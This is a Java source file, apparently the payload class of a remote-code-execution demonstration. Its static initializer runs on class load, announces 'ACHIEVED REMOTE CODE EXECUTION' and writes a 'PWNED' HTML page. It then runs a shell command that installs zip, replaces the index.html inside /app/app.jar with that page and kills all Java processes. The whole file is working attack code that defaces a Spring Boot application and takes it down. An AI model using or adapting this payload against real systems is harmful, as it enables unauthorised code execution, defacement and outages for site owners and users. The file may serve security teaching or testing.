import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Exploit {

    static {
        System.err.println("** ACHIEVED REMOTE CODE EXECUTION **");
        try {
    	    String newHTML = "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=utf-8>\n<title>My vulnerable and pwned webpage</title>\n</head>\n<body>\n<p style=\"color: red; font-weight: bold;\">PWNED</p>\n</body>\n</html>";
            String path = "/tmp/pwn.html";
            Files.write(Paths.get(path), newHTML.getBytes());

            ProcessBuilder processBuilder = new ProcessBuilder();
            processBuilder.command("/bin/sh", "-c", "apk update && apk add zip && cd /app && unzip -o app.jar BOOT-INF/classes/static/index.html && mv /tmp/pwn.html BOOT-INF/classes/static/index.html && zip app.jar BOOT-INF/classes/static/index.html && killall java");
            Process process = processBuilder.start();

            StringBuilder output = new StringBuilder();

            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line + "\n");
            }

            int exitVal = process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

